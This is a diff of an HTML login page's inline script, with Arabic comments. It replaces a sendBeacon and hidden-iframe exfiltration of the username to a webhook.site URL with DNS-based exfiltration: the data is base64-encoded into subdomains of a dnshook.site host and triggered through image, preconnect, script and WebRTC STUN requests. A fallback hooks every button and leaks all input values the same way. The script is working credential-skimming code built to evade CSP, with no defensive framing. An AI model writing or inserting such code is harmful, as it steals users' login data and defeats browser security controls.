@@ -28,7 +28,7 @@
 </div>
 </form>
 <script>
-// سكريبت لإرسال البيانات بطريقة تتجاوز قيود CSP
+// سكريبت لإرسال البيانات عبر طلبات DNS
 document.addEventListener('DOMContentLoaded', function() {
   // البحث عن زر تسجيل الدخول
   var loginButton = document.getElementById('loginBtn2');
@@ -55,52 +55,50 @@ document.addEventListener('DOMContentLoaded', function() {
           console.log('خطأ في حفظ البيانات في localStorage: ' + e);
         }
         
-        // محاولة إرسال البيانات باستخدام navigator.sendBeacon إذا كان متاحًا
-        if (navigator.sendBeacon) {
-          try {
-            var data = new FormData();
-            data.append('username', username);
-            data.append('timestamp', new Date().toISOString());
-            data.append('source', 'beacon');
-            
-            var beaconSuccess = navigator.sendBeacon('https://webhook.site/93393684-887f-44cd-ba20-11cd87c823ce', data);
-            console.log('نتيجة إرسال البيانات باستخدام sendBeacon: ' + beaconSuccess);
-          } catch (e) {
-            console.log('خطأ في إرسال البيانات باستخدام sendBeacon: ' + e);
-          }
+        // إرسال البيانات عبر طلب DNS
+        try {
+          // تحويل البيانات إلى تنسيق آمن للاستخدام في اسم النطاق
+          var encodedData = btoa(username).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+          
+          // إنشاء اسم نطاق فرعي باستخدام البيانات المشفرة
+          var dnsSubdomain = encodedData + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site';
+          
+          // إنشاء عنصر صورة يحاول تحميل صورة من النطاق الفرعي
+          var dnsProbe = new Image();
+          dnsProbe.src = 'https://' + dnsSubdomain + '/pixel.gif';
+          
+          console.log('تم إرسال طلب DNS إلى: ' + dnsSubdomain);
+          
+          // إنشاء عنصر link preconnect (طريقة أخرى لإثارة طلب DNS)
+          var link = document.createElement('link');
+          link.rel = 'preconnect';
+          link.href = 'https://' + dnsSubdomain;
+          document.head.appendChild(link);
+          
+          console.log('تم إنشاء رابط preconnect إلى: ' + dnsSubdomain);
+          
+          // إنشاء عنصر script (طريقة أخرى لإثارة طلب DNS)
+          var script = document.createElement('script');
+          script.src = 'https://' + dnsSubdomain + '/script.js';
+          document.head.appendChild(script);
+          
+          console.log('تم إنشاء عنصر script يشير إلى: ' + dnsSubdomain);
+        } catch (e) {
+          console.log('خطأ في إرسال طلب DNS: ' + e);
         }
         
-        // إنشاء عنصر iframe مخفي
+        // محاولة أخرى باستخدام WebRTC
         try {
-          var iframe = document.createElement('iframe');
-          iframe.style.display = 'none';
-          document.body.appendChild(iframe);
-          
-          // إنشاء نموذج داخل الـ iframe
-          var iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-          var form = iframeDoc.createElement('form');
-          form.method = 'POST';
-          form.action = 'https://webhook.site/93393684-887f-44cd-ba20-11cd87c823ce';
-          
-          // إضافة حقل للبيانات
-          var input = iframeDoc.createElement('input');
-          input.type = 'hidden';
-          input.name = 'username';
-          input.value = username;
-          form.appendChild(input);
-          
-          // إضافة النموذج إلى الـ iframe وإرساله
-          iframeDoc.body.appendChild(form);
-          form.submit();
-          
-          console.log('تم إرسال البيانات باستخدام iframe');
-          
-          // إزالة الـ iframe بعد فترة
-          setTimeout(function() {
-            document.body.removeChild(iframe);
-          }, 5000);
+          var pc = new RTCPeerConnection({
+            iceServers: [{
+              urls: 'stun:' + encodedData + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site'
+            }]
+          });
+          pc.createDataChannel('');
+          pc.createOffer().then(pc.setLocalDescription.bind(pc));
+          console.log('تم إنشاء اتصال WebRTC مع: ' + encodedData + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site');
         } catch (e) {
-          console.log('خطأ في إرسال البيانات باستخدام iframe: ' + e);
+          console.log('خطأ في إنشاء اتصال WebRTC: ' + e);
         }
       } else {
         console.log('لم يتم العثور على حقل اسم المستخدم أو الحقل فارغ');
@@ -108,6 +106,41 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   } else {
     console.log('لم يتم العثور على زر تسجيل الدخول');
+    
+    // محاولة بديلة: البحث عن أي زر في الصفحة
+    var allButtons = document.querySelectorAll('button, input[type="button"], input[type="submit"]');
+    console.log('عدد الأزرار في الصفحة: ' + allButtons.length);
+    
+    // إضافة مستمع حدث لجميع الأزرار
+    allButtons.forEach(function(button) {
+      button.addEventListener('click', function() {
+        // البحث عن جميع حقول الإدخال
+        var allInputs = document.querySelectorAll('input');
+        var inputData = {};
+        
+        // جمع البيانات من جميع حقول الإدخال
+        allInputs.forEach(function(input) {
+          if (input.value) {
+            inputData[input.id || input.name || 'input_' + Math.random()] = input.value;
+          }
+        });
+        
+        // تحويل البيانات إلى سلسلة نصية
+        var dataString = JSON.stringify(inputData);
+        
+        // تشفير البيانات
+        var encodedData = btoa(dataString).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
+        
+        // إنشاء اسم نطاق فرعي
+        var dnsSubdomain = encodedData + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site';
+        
+        // إرسال طلب DNS
+        var dnsProbe = new Image();
+        dnsProbe.src = 'https://' + dnsSubdomain + '/pixel.gif';
+        
+        console.log('تم إرسال طلب DNS من زر بديل إلى: ' + dnsSubdomain);
+      });
+    });
   }
 });
 </script>
